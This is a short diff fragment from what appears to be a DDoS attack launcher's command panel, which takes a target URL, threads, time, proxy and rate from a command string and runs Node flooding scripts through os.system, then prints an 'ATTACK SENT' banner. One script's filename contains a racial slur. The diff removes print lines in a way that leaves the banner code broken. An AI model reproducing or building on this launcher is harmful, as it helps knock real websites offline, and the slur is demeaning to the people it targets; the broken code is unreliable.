@@ -639,7 +639,6 @@ def main():
                 proxy = cnc.split()[4]
                 rps = cnc.split()[5]
                 os.system(f'node HTTP-NIGGA.js {url} {time} {thread} {proxy} {rp}')
-				print(f"""
 \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
 \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
 \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
@@ -667,8 +666,6 @@ def main():
                 thread = cnc.split()[2]
                 time = cnc.split()[3]
                 os.system(f'node MIX.js {url} {thread} {time}')
-				os.system ("clear")
-				print(f"""
 \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
 \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
 \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
